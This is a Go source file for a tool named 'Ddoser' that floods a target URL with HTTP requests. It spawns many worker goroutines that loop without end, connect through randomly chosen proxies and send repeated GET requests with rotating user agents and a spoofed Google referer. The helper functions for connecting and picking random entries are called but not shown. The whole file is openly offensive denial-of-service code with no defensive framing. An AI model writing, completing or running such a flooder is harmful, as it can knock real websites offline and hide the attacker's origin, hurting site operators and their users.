package main

import (
	"fmt"
	"net/http"
	"net/url"
	"os"
	"time"
)

type Ddoser struct {
	url        string
	numWorkers int
	useragents []string
	proxies    []string
}

func NewDdoser(target string, number int, useragents, proxies []string) (*Ddoser, error) {
	u, err := url.Parse(target)

	// Check if the url is valid
	if err != nil || len(u.Host) == 0 || len(u.Port()) == 0 {
		return nil, fmt.Errorf("invalid URL: %s", target)
	}

	return &Ddoser{
		url:        target,
		numWorkers: number,
		useragents: useragents,
		proxies:    proxies,
	}, nil
}

func (d *Ddoser) Run() {
	for i := 0; i < d.numWorkers; i++ {
		go func() {
			req, err := http.NewRequest("GET", d.url, nil)
			if err != nil {
				return
			}
			req.Header.Set("Accept", "*/*")
			req.Header.Set("Connection", "keep-alive")
			req.Header.Set("Referer", "https://www.google.com/")

			for {
				conn, err := connect(random(d.proxies), d.url)

				if err != nil {
					continue
				}

				func() {
					defer conn.Close()
					for i := 0; i < 100; i++ {
						req.Header.Set("User-Agent", random(d.useragents))
						req.Write(conn)
					}
				}()
			}
		}()
		fmt.Printf("\rWorker [%d] are ready", i+1)
		os.Stdout.Sync()
		time.Sleep(time.Millisecond * 1)
	}

	fmt.Println()
}
